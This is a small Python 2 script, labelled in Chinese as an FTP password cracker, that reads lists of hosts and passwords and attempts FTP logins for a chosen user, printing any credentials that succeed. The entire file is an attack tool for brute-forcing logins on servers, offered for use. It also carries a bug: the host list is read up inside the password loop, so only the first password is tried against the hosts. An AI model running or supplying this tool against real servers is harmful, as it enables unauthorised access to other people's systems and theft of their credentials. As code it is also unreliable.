#!/usr/bin/env python
#encoding=utf-8
#破解ftp密码 by daige

import ftplib
import optparse

def connect(host,user,password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user,password)
        print '[+]'+ host +':'+ user +'/'+ password
    except Exception,e:
        pass

def main():
    parser = optparse.OptionParser('usage %prog -H <host lis file> -u <user> -P <password list>')
    parser.add_option('-H',dest='hostFile',type='string',help='specify  hos list file')
    parser.add_option('-u',dest='user',type='string',help='specify the user')
    parser.add_option('-P',dest='passwdFile',type='string',help='specify targer password list file')

    (options,args) = parser.parse_args()

    hostFile = options.hostFile
    user = options.user
    passwdFile = options.passwdFile

    if hostFile == None or user == None or passwdFile == None:
        print parser.usage
        exit(0)

    passwdfn = open(passwdFile,'r')
    hostfn   = open(hostFile,'r')
    for line in passwdfn.readlines():
        password = line.strip('\r').strip('\n')
        for host in hostfn.readlines():
            host = host.strip('\r').strip('\n')
        #    print '[-]Testing: ' +host +':'+ user +'/'+str(password)
            connect(host,user,password)

if __name__ == '__main__':
    main()
